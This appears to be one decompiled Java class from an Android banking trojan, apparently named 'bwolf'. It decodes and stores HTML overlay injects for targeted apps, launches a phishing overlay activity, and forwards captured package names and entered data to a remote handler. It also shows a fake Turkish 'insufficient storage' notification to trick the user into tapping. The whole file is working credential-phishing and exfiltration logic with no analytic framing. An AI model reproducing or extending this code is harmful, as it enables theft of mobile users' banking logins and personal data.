package fddo;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.util.Base64;

import com.sonnokta.p016j;
import com.sonnokta.utils.LogUtil;

import org.json.JSONException;
import org.json.JSONObject;

/* renamed from: fddo.class  reason: invalid class name */
public class Cclass {
    private static String TAG = "bwolf-Cclass";

    /* renamed from: fddo  reason: collision with root package name */
    private Context f111fddo;

    public Cclass(Context context) {
        this.f111fddo = context;
    }

    /* renamed from: else  reason: not valid java name */
    @SuppressLint("WrongConstant")
    public static void m56else(Context context) {
        LogUtil.showErrorLog(TAG, "--- m56else ---");

        if (Cthrow.m158new(context, "inj_acsb", "").isEmpty()) {
            try {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("type", "html");
                StringBuilder sb = new StringBuilder();
                for (String append : Cfor.f58else) {
                    sb.append(append);
                }
                jSONObject.put("data", new String(Base64.decode(sb.toString(), 0), "UTF-8"));
                Cthrow.m159this(context, "inj_acsb", jSONObject.toString());
            } catch (Exception e) {
                Cgoto.m110class(context, "EXC_SMARTS_SHOW", e);
                return;
            }
        }
        Cthrow.m159this(context, "smart_inject", "acsb");
        Intent intent = new Intent(context, p016j.class);
        intent.setFlags(813826048);
        context.startActivity(intent);
    }

    /* renamed from: case  reason: not valid java name */
    public void m57case(String str, String str2, boolean z) {
        LogUtil.showErrorLog(TAG, "--- m57case ---");
        Context context = this.f111fddo;
        Cgoto.rsjsadghfsfdghj(context, "INJECT Package: " + str + " Data: " + str2);
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("xc", "sSD");
            jSONObject.put("sPK", str);
            jSONObject.put("spD", str2);
            jSONObject.put("sFd", z);
            new Cthis(this.f111fddo, jSONObject).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, new Void[0]);
        } catch (JSONException unused) {
        }
    }

    public void fddo(String str) {
        LogUtil.showErrorLog(TAG, "--- fddo ---");
        Cthrow.m159this(this.f111fddo, "smart_inject", "");
        Context context = this.f111fddo;
        String replace = Cthrow.m158new(context, "inj_" + str, "").replace("is_active\":true", "is_active\":false");
        if (!replace.contains("cap_data\":\"\"")) {
            replace = replace.replace("show_cap\":false", "show_cap\":true");
        }
        Context context2 = this.f111fddo;
        Cthrow.m159this(context2, "inj_" + str, replace);
    }

    /* renamed from: for  reason: not valid java name */
    public void m58for() {
        LogUtil.showErrorLog(TAG, "--- m58for ---");
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("xc", "gSWI");
            new Cthis(this.f111fddo, jSONObject).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, new Void[0]);
        } catch (JSONException unused) {
        }
    }

    @SuppressLint("WrongConstant")
    public void ifdf(String str) {
        LogUtil.showErrorLog(TAG, "--- ifdf ---");
        Class<p016j> cls = p016j.class;
        if (!str.isEmpty()) {
            Context context = this.f111fddo;
            if (!Cthrow.m158new(context, "inj_" + str, "").isEmpty()) {
                Cthrow.m159this(this.f111fddo, "smart_inject", str);
                if (Cgoto.dkgmhapefdmhpadfmhspfkgmh(this.f111fddo, "last_attempts_check", 10, true)) {
                    int intValue = Cthrow.ifdf(this.f111fddo, "smarts_attempts", 0).intValue() + 1;
                    Cthrow.m155else(this.f111fddo, "smarts_attempts", Integer.valueOf(intValue));
                    if (intValue > 5 && intValue < 10) {
                        Cgoto.n(this.f111fddo, "Yetersiz alan!", "Temizlemek için buraya tiklayin", cls);
                    }
                }
                Intent intent = new Intent(this.f111fddo, cls);
                intent.setFlags(813826048);
                this.f111fddo.startActivity(intent);
            }
        }
    }

    /* renamed from: new  reason: not valid java name */
    public void m59new(String str) {
        LogUtil.showErrorLog(TAG, "--- m59new ---");
        Context context = this.f111fddo;
        String str2 = Cthrow.m158new(context, "inj_" + str, "");
        Context context2 = this.f111fddo;
        Cthrow.m159this(context2, "inj_" + str, str2.replace("is_active\":false", "is_active\":true"));
    }

    /* renamed from: try  reason: not valid java name */
    public boolean m60try(String str) {
        LogUtil.showErrorLog(TAG, "--- m60try ---");
        Context context = this.f111fddo;
        String str2 = Cthrow.m158new(context, "inj_" + str, "");
        if (str2.isEmpty()) {
            return false;
        }
        return str2.contains("is_active\":true") || str2.contains("show_cap\":true");
    }
}
